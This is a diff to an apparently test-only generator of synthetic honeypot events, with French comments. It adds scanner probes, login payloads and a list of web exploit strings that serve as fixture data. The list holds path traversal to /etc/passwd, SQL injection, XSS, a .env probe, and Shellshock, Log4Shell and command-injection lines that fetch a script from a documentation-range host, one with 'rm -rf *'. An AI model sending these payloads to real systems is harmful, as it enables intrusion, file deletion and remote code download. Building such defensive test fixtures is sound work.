@@ -72,12 +72,44 @@ CLIENT_BANNERS = [
     b"SSH-2.0-Go",
     b"SSH-2.0-PUTTY",
 ]
+HTTP_PROBES = [
+    b"GET / HTTP/1.1\r\nHost: x\r\nUser-Agent: Mozilla/5.0 zgrab/0.x\r\n\r\n",
+    b"GET / HTTP/1.1\r\nHost: x\r\nUser-Agent: masscan/1.3\r\n\r\n",
+    b"HEAD / HTTP/1.0\r\n\r\n",
+]
+# Exploits tels qu'on les observe réellement sur un honeypot exposé : beaucoup sont
+# encodés dans l'URL, pour échapper aux filtres naïfs.
 EXPLOIT_PAYLOADS = [
     b"GET /../../../../etc/passwd HTTP/1.1\r\nHost: x\r\n\r\n",
+    b"GET /cgi-bin/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1\r\nHost: x\r\n\r\n",
     b"GET /index.php?id=1' or '1'='1 HTTP/1.1\r\nHost: x\r\n\r\n",
+    b"GET /index.php?id=1%27%20OR%20%271%27=%271 HTTP/1.1\r\nHost: x\r\n\r\n",
     b"POST /cgi-bin/x HTTP/1.1\r\n\r\n() { :;};wget http://198.51.100.9/m.sh",
     b"GET /?q=union select null,null HTTP/1.1\r\nHost: x\r\n\r\n",
+    b"GET /?x=${jndi:ldap://198.51.100.9/a} HTTP/1.1\r\nHost: x\r\n\r\n",
+    b"GET /shell?cd+/tmp;rm+-rf+*;wget+http://198.51.100.9/m.sh HTTP/1.1\r\n\r\n",
+    b"GET /.env HTTP/1.1\r\nHost: x\r\n\r\n",
+    b"GET /?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1\r\nHost: x\r\n\r\n",
 ]
+
+
+def _credentials_payload(service: ServiceName, rng: random.Random, user: str, pwd: str) -> bytes:
+    """Ce que chaque leurre reçoit réellement lors d'une tentative d'authentification."""
+    if service is ServiceName.HTTP:
+        return f"POST /login HTTP/1.1\r\n\r\nusername={user}&password={pwd}".encode()
+    if service is ServiceName.FTP:
+        return f"USER {user}\r\nPASS {pwd}\r\n".encode()
+    return rng.choice(CLIENT_BANNERS) + b"\r\n" + f"{user}:{pwd}".encode()
+
+
+def _probe_payload(service: ServiceName, rng: random.Random) -> bytes:
+    if service is ServiceName.HTTP:
+        return rng.choice(HTTP_PROBES)
+    if service is ServiceName.FTP:
+        return b""
+    return rng.choice(CLIENT_BANNERS)
+
+
 # Plages documentaires (RFC 5737) : jamais de vraie adresse dans un jeu de test.
 IP_POOLS = ["192.0.2.", "198.51.100.", "203.0.113."]
 
@@ -99,10 +131,12 @@ def make_event(rng: random.Random, *, occurred_at: datetime | None = None) -> Ra
     if kind == "credentials":
         username = rng.choice(USERNAMES)
         password = rng.choice(PASSWORDS)
-        payload = rng.choice(CLIENT_BANNERS) + b"\r\n" + f"{username}:{password}".encode()
+        payload = _credentials_payload(service, rng, username, password)
     elif kind == "probe":
-        payload = rng.choice(CLIENT_BANNERS)
+        payload = _probe_payload(service, rng)
     else:
+        # Les charges d'exploitation sont des requêtes web : elles visent le leurre HTTP.
+        service = ServiceName.HTTP
         payload = rng.choice(EXPLOIT_PAYLOADS)
 
     dest_port = {ServiceName.SSH: 22, ServiceName.HTTP: 80, ServiceName.FTP: 21}[service]
